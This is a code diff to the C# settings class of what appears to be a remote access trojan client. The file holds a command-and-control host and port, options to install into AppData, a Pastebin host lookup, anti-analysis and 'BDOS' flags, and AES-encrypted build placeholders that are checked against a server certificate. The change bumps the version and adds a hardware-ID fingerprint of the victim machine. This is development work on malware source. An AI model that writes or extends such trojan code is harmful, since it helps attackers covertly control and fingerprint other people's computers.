@@ -1,4 +1,5 @@
 ﻿using Client.Algorithm;
+using Client.Helper;
 using System;
 using System.IO;
 using System.Security.Cryptography;
@@ -12,7 +13,7 @@ namespace Client
 #if DEBUG
         public static string Ports = "6606";
         public static string Hosts = "127.0.0.1";
-        public static string Version = "0.5.3";
+        public static string Version = "0.5.4";
         public static string Install = "false";
         public static string InstallFolder = "AppData";
         public static string InstallFile = "Test.exe";
@@ -25,6 +26,7 @@ namespace Client
         public static Aes256 aes256 = new Aes256(Key);
         public static string Pastebin = "null";
         public static string BDOS = "false";
+        public static string Hwid = Methods.HWID();
 
 #else
         public static string Ports = "%Ports%";
@@ -42,6 +44,7 @@ namespace Client
         public static Aes256 aes256;
         public static string Pastebin = "%Pastebin%";
         public static string BDOS = "%BDOS%";
+        public static string Hwid = "";
 #endif
 
 
@@ -62,6 +65,7 @@ namespace Client
                 Pastebin = aes256.Decrypt(Pastebin);
                 Anti = aes256.Decrypt(Anti);
                 BDOS = aes256.Decrypt(BDOS);
+                Hwid = Methods.HWID();
                 Serversignature = aes256.Decrypt(Serversignature);
                 ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                 return VerifyHash();
